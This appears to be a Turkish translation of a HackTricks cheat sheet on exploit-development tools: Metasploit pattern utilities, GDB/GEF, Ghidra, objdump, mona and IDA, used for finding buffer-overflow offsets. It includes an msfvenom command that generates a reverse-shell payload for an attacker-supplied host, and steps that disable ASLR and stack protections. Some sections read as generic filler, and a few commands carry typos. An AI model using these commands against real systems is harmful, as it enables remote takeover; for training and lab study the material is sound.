<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Shellcode'lar

Shellcode'lar, kötü niyetli bir saldırganın hedef sistemdeki güvenlik açıklarını istismar etmek için kullandığı küçük, derlenmiş kod parçalarıdır. Bu kod parçaları, saldırganın hedef sisteme erişim sağlamasına ve istediği işlemleri gerçekleştirmesine olanak tanır.

Shellcode'lar genellikle bellek bozma saldırıları sırasında kullanılır. Bu saldırılar, hedef sistemin belleğini bozarak, saldırganın kötü amaçlı kodu çalıştırmasına izin verir. Shellcode'lar, genellikle hedef sistemin işletim sistemi ve donanım mimarisine özgü olarak yazılır.

Shellcode'lar, çeşitli programlama dilleriyle yazılabilir, ancak genellikle düşük seviye diller (Assembly) kullanılarak oluşturulur. Bu, saldırganın bellek manipülasyonu ve hedef sistemin işletim sistemi arayüzlerine doğrudan erişim sağlamasını sağlar.

Shellcode'lar, saldırganın hedef sistemi ele geçirmesine ve istediği işlemleri gerçekleştirmesine olanak tanır. Bu nedenle, güvenlik uzmanları ve siber güvenlik uzmanları, shellcode'ları anlamak ve tespit etmek için sürekli olarak güncel kalmalıdır.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# Kurulum

GDB, GNU Hata Ayıklayıcı olarak da bilinen bir hata ayıklama aracıdır. GDB, bir programın çalışma zamanında hataları bulmak ve düzeltmek için kullanılır. GDB'nin kurulumu için aşağıdaki adımları izleyin:

### Linux

1. Terminali açın ve aşağıdaki komutu çalıştırın:

   ```
   sudo apt-get install gdb
   ```

2. Kurulum tamamlandıktan sonra, GDB'yi kullanmaya başlayabilirsiniz.

### macOS

1. Terminali açın ve aşağıdaki komutu çalıştırın:

   ```
   brew install gdb
   ```

2. Kurulum tamamlandıktan sonra, GDB'yi kullanmaya başlayabilirsiniz.

### Windows

1. GDB'nin Windows sürümünü indirin ve kurulum sihirbazını başlatın.

2. Kurulum sihirbazını takip ederek GDB'yi bilgisayarınıza kurun.

3. Kurulum tamamlandıktan sonra, GDB'yi kullanmaya başlayabilirsiniz.
```
apt-get install gdb
```
## Parametreler

**-q** --> Banner'ı gösterme\
**-x \<dosya>** --> Buradan otomatik olarak GDB talimatlarını çalıştır\
**-p \<pid>** --> İşleme bağlan

### Talimatlar

\> **disassemble main** --> Fonksiyonu ayrıştır\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Oluşturulan işlemi takip et\
\> **p system** --> system fonksiyonunun adresini bul\
\> **help**\
\> **quit**

\> **br func**  --> Fonksiyona kesme noktası ekle\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Belirtilen sayıda kesme noktasını sil\
\> **watch EXPRESSION** --> Değer değişirse kes

**> run** --> Çalıştır\
**> start** --> Başla ve main fonksiyonunda kes\
\> **n/next** --> Bir sonraki talimatı çalıştır (içeri girmeksizin)\
\> **s/step** --> Bir sonraki talimatı çalıştır\
\> **c/continue** --> Bir sonraki kesme noktasına kadar devam et

\> **set $eip = 0x12345678** --> $eip değerini değiştir\
\> **info functions** --> Fonksiyonlar hakkında bilgi\
\> **info functions func** --> Fonksiyonun bilgisi\
\> **info registers** --> Kayıtların değeri\
\> **bt** --> Yığın\
\> **bt full** --> Detaylı yığın

\> **print değişken**\
\> **print 0x87654321 - 0x12345678** --> Hesapla\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> İçeriği sekizlik/onaltılı/10'luk/ikili/talimat/ascii olarak göster

* **x/o 0xDir\_hex**
* **x/2x $eip** --> EIP'den 2 kelime
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8 byte (b-> byte, h-> 2 byte, w-> 4 byte, g-> 8 byte)
* **i r eip** --> $eip değeri
* **x/w pointer** --> İşaretçinin değeri
* **x/s pointer** --> İşaretçi tarafından gösterilen dize
* **x/xw \&pointer** --> İşaretçinin bulunduğu adres
* **x/i $eip** —> EIP'nin talimatları

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Hileler

### GDB aynı adresler

Hata ayıklama yaparken GDB, **yürütüldüğünde ikili tarafından kullanılan adreslerden biraz farklı adreslere sahip olabilir.** GDB'nin aynı adreslere sahip olmasını sağlamak için aşağıdaki adımları izleyebilirsiniz:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<yol>` _İkili dosyanın mutlak yolunu yazın_
* Aynı mutlak yolu kullanarak ikili dosyayı sömürün
* GDB'yi kullanırken ve ikili dosyayı sömürürken `PWD` ve `OLDPWD` aynı olmalıdır

### Çağrılan fonksiyonları bulmak için geri izleme

**Statik olarak bağlanmış bir ikili dosyanız** olduğunda, tüm fonksiyonlar ikili dosyaya ait olacaktır (harici kütüphanelere değil). Bu durumda, örneğin kullanıcıdan giriş istemek için ikilinin izlediği akışı **belirlemek zor olacaktır**.\
Bu akışı kolayca belirlemek için **gdb** ile ikili dosyayı çalıştırın ve giriş istendiğinde **CTRL+C** ile durdurun, ardından **`bt`** (**geri izleme**) komutunu kullanarak çağrılan fonksiyonları görüntüleyin:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDB sunucusu

`gdbserver --multi 0.0.0.0:23947` (IDA'da Linux makinedeki yürütülebilir dosyanın mutlak yolunu ve Windows makinedeki yürütülebilir dosyanın mutlak yolunu doldurmanız gerekmektedir)

# Ghidra

## Yığın ofseti bulma

**Ghidra**, **yerel değişkenlerin konumu hakkındaki bilgiler sayesinde bir tampon taşmasının ofsetini bulmak için çok kullanışlıdır.**\
Örneğin, aşağıdaki örnekte, `local_bc` içinde bir tampon taşması, `0xbc` bir ofsete ihtiyaç olduğunu gösterir. Ayrıca, `local_10` bir canary cookie ise, `local_bc`'den üzerine yazmak için `0xac` bir ofset olduğunu gösterir.\
_Unutmayın ki RIP'nin kaydedildiği ilk 0x08, RBP'ye aittir._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Korumalar olmadan derleme\
**-o** --> Çıktı\
**-g** --> Kodu kaydet (GDB bunu görebilecek)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Linux'ta ASLR'yi devre dışı bırakmak için

**Bir kabuk kodunu derlemek için:**\
**nasm -f elf assembly.asm** --> ".o" döndürür\
**ld assembly.o -o shellcodeout** --> Yürütülebilir

# Objdump

**-d** --> **Yürütülebilir** bölümleri aç (derlenmiş bir kabuk kodunun opcode'larını görüntüle, ROP Gadget'ları bul, işlev adreslerini bul...)\
**-Mintel** --> **Intel** sözdizimi\
**-t** --> **Semboller** tablosu\
**-D** --> **Tümünü aç** (statik değişkenin adresi)\
**-s -j .dtors** --> dtors bölümü\
**-s -j .got** --> got bölümü\
\-D -s -j .plt --> **plt** bölümü **decompile** edilmiş\
**-TR** --> **Yer değiştirmeler**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> GOT'ta değiştirilecek "puts" adresi\
**objdump -D ./exec | grep "VAR\_NAME"** --> Bir statik değişkenin adresi (bunlar DATA bölümünde saklanır).

# Çekirdek dökümleri

1. Programımı başlatmadan önce `ulimit -c unlimited` komutunu çalıştırın
2. `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t` komutunu çalıştırın
3. `sudo gdb --core=\<path/core> --quiet` komutunu çalıştırın

# Daha Fazla

**ldd executable | grep libc.so.6** --> Adres (ASLR varsa, her seferinde değişir)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Adresin çok değişip değişmediğini görmek için döngü\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> "system" ofseti\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> "/bin/sh" ofseti

**strace executable** --> Yürütülebilir tarafından çağrılan işlevler\
**rabin2 -i ejecutable -->** Tüm işlevlerin adresi

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Uzaktan Linux'ta Hata Ayıklama

IDA klasörü içinde, bir Linux içinde bir ikiliyi hata ayıklamak için kullanılabilecek ikili dosyalar bulunur. Bunun için _linux\_server_ veya _linux\_server64_ ikilisini Linux sunucusuna taşıyın ve ikili dosyayı içeren klasörde çalıştırın:
```
./linux_server64 -Ppass
```
Ardından, hata ayıklama aracını yapılandırın: Hata Ayıklayıcı (uzaktan linux) --> İşlem seçenekleri...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanlık seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
